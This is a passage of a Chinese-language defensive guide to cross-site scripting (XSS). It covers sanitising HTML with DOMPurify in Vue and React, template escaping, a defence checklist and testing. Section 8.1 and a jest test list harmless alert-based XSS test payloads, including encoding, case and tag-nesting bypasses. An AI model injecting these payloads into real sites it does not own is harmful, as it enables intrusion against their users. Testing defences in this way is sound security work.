import DOMPurify from 'dompurify'

const userInput = '<script>alert("XSS")</script>'
const url = 'javascript:alert(1)'

// ✅ 如需 v-html，必须先过滤
const safeHtml = computed(() => DOMPurify.sanitize(userInput))
</script>
```

**Vue 3 自定义指令：安全 v-html**：

```javascript
// main.ts
import DOMPurify from 'dompurify'

app.directive('safe-html', {
  beforeMount(el, binding) {
    el.innerHTML = DOMPurify.sanitize(binding.value)
  },
  updated(el, binding) {
    if (binding.value !== binding.oldValue) {
      el.innerHTML = DOMPurify.sanitize(binding.value)
    }
  },
})
```

```vue
<!-- 使用自定义指令替代 v-html -->
<div v-safe-html="richContent"></div>
```

### 6.2 React 中的 XSS 防御

**React 默认安全**：`{}` 表达式自动编码，**只有 `dangerouslySetInnerHTML` 危险**。

```jsx
import DOMPurify from 'dompurify'

function Component() {
  const userInput = '<script>alert("XSS")</script>'
  
  return (
    <>
      {/* ✅ 安全：自动编码 */}
      <div>{userInput}</div>
      <div title={userInput}></div>
      
      {/* ❌ 危险 */}
      <div dangerouslySetInnerHTML={{ __html: userInput }} />
      
      {/* ✅ 安全：过滤后使用 */}
      <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />
    </>
  )
}
```

### 6.3 服务端模板防御

**EJS**：

```ejs
<!-- ✅ 自动编码 -->
<div><%= userInput %></div>

<!-- ❌ 不编码，危险 -->
<div><%- userInput %></div>

<!-- ✅ 过滤后使用 -->
<div><%- DOMPurify.sanitize(userInput) %></div>
```

**Pug**：

```pug
//- ✅ 自动编码
div= userInput

//- ❌ 不编码
div!= userInput
```

---

## 七、XSS 防御最佳实践

### 7.1 防御优先级

```
① 输出编码（核心，必做）
   ↓
② CSP 策略（纵深防御）
   ↓
③ HttpOnly Cookie（防窃取）
   ↓
④ 输入验证（辅助）
   ↓
⑤ 框架默认安全（技术选型）
   ↓
⑥ 安全测试（CI/CD 集成）
```

### 7.2 防御检查清单

| 检查项 | 说明 | 优先级 |
| --- | --- | --- |
| 所有用户输入输出前编码 | 按上下文选择编码方式 | ★★★★★ |
| 使用 `textContent` 替代 `innerHTML` | 除非必要，否则不解析 HTML | ★★★★★ |
| `v-html`/`dangerouslySetInnerHTML` 配合 DOMPurify | 必须过滤 | ★★★★★ |
| Cookie 设置 HttpOnly + Secure + SameSite | 防窃取 | ★★★★★ |
| 配置 CSP 策略 | 禁止内联脚本、限制来源 | ★★★★ |
| URL 跳转验证协议 | 防 `javascript:` 协议 | ★★★★ |
| 富文本使用白名单过滤 | DOMPurify | ★★★★ |
| API 响应数据清洗 | 后端返回也需过滤 | ★★★ |
| 设置 X-XSS-Protection | 兼容旧浏览器 | ★★ |
| 设置 X-Frame-Options | 防点击劫持 | ★★ |
| 禁用 `eval()` / `new Function()` | 危险函数 | ★★★ |
| 定期安全扫描 | 自动化检测 | ★★★ |

### 7.3 常见误区

| 误区 | 正解 |
| --- | --- |
| "输入过滤了就安全" | 输入过滤不能替代输出编码，不同上下文需不同编码 |
| "用了 HTTPS 就不会有 XSS" | HTTPS 防窃听，不防 XSS |
| "WAF 能拦截所有 XSS" | WAF 无法检测 DOM 型 XSS |
| "框架自动防 XSS" | 框架默认安全，但 `v-html`/`dangerouslySetInnerHTML` 仍危险 |
| "转义了 `<` 和 `>` 就够了" | 不同上下文需不同编码（属性/JS/URL） |
| "内联脚本很方便" | 内联脚本破坏 CSP，应用外部脚本 + nonce |

### 7.4 安全编码原则

1. **永不信任用户输入**：任何来自用户的数据都视为恶意
2. **默认安全**：框架选择默认编码的（Vue `{{}}`、React `{}`）
3. **显式不安全**：使用 `v-html` 时必须显式过滤
4. **纵深防御**：多层防御（编码 + CSP + HttpOnly）
5. **最小权限**：Cookie 设置 HttpOnly，限制脚本权限
6. **定期审计**：代码审查 + 自动化扫描

---

## 八、XSS 检测与测试

### 8.1 手动测试 Payload

```html
<!-- 基础测试 -->
<script>alert('XSS')</script>

<!-- 事件触发 -->
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

<!-- 属性注入 -->
" onmouseover="alert('XSS')

<!-- URL 注入 -->
javascript:alert('XSS')

<!-- 编码绕过 -->
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>

<!-- 大小写混淆 -->
<ScRiPt>alert('XSS')</ScRiPt>

<!-- 标签嵌套 -->
<scr<script>ipt>alert('XSS')</script>

<!-- SVG -->
<svg><script>alert('XSS')</script></svg>
```

### 8.2 自动化扫描工具

| 工具 | 类型 | 说明 |
| --- | --- | --- |
| **OWASP ZAP** | 开源 | 综合安全扫描，含 XSS |
| **Burp Suite** | 商业 | 专业渗透测试工具 |
| **Acunetix** | 商业 | 自动化 Web 漏洞扫描 |
| **Nessus** | 商业 | 综合漏洞扫描 |
| **XSStrike** | 开源 | 专门针对 XSS 的检测工具 |
| **Brakeman**（Ruby） | 开源 | 静态代码分析 |

### 8.3 自动化测试集成

```javascript
// 使用 jest + XSS payload 测试
describe('XSS 防御测试', () => {
  const payloads = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>',
    "javascript:alert(1)",
    '<svg onload=alert(1)>',
  ]

  payloads.forEach((payload) => {
    it(`应正确转义: ${payload}`, () => {
      const escaped = XSSTool.escapeHtml(payload)
      // 转义后不应包含原始危险标签
      expect(escaped).not.toContain('<script>')
      expect(escaped).not.toContain('onerror=')
      expect(escaped).not.toContain('javascript:')
    })
  })
})
```

### 8.4 浏览器开发者工具检查

```
1. 检查 Cookie 是否设置 HttpOnly
   Application → Cookies → 查看 HttpOnly 列

2. 检查 CSP 响应头
   Network → 点击请求 → Response Headers → Content-Security-Policy

3. 检查 XSS 过滤
   Console → 输入 document.cookie → 验证 HttpOnly Cookie 不可见
```

---

## 附录 参考资料

### 工具与库

- **DOMPurify**：https://github.com/cure53/DOMPurify（推荐，XSS 过滤库）
- **xss**：https://github.com/leizongmin/js-xss（Node.js XSS 过滤）
- **OWASP Cheat Sheet**：https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- **CSP Evaluator**：https://csp-evaluator.withgoogle.com/

### 规范文档

- **MDN CSP**：https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP
- **OWASP XSS**：https://owasp.org/www-community/attacks/xss/
- **CSP Level 3**：https://www.w3.org/TR/CSP3/

### 相关标准

- **RFC 6265bis**：Cookie 规范（HttpOnly/Secure/SameSite）
- **HTML Living Standard**：https://html.spec.whatwg.org/

---

## 速查表：XSS 防御一览

```
┌──────────────────────────────────────────────────────────────┐
│                    XSS 防御决策树                              │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  用户输入                                                      │
│    │                                                         │
│    ▼                                                         │
│  输入验证（白名单）                                             │
│    │  ├─ 格式不符 → 拒绝                                       │
│    │  └─ 格式合法 ↓                                           │
│    ▼                                                         │
│  服务端存储/处理                                                │
│    │                                                         │
│    ▼                                                         │
│  输出编码（按上下文）                                            │
│    │  ├─ HTML 内容 → HTML 实体编码                             │
│    │  ├─ HTML 属性 → 属性编码（加引号）                         │
│    │  ├─ JS 字符串 → JS 编码                                   │
│    │  ├─ URL 参数 → URL 编码                                   │
│    │  └─ 富文本  → DOMPurify 白名单过滤                        │
│    ▼                                                         │
│  浏览器渲染                                                     │
│    │                                                         │
│    ▼                                                         │
│  纵深防御                                                       │
│    ├─ CSP 策略（禁内联/限来源）                                 │
│    ├─ HttpOnly Cookie（防窃取）                                │
│    ├─ X-XSS-Protection（旧浏览器）                             │
│    └─ X-Frame-Options（防劫持）                                │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

---

> **文档说明**：本文档共 8 大章节，系统覆盖 XSS 漏洞的定义、分类、原理、危害、防御措施、代码示例、框架实践、检测测试。核心原则是**输出编码（按上下文）+ CSP 纵深防御 + HttpOnly 防窃取**。建议团队将防御检查清单纳入 Code Review 流程，并在 CI/CD 中集成自动化 XSS 扫描。
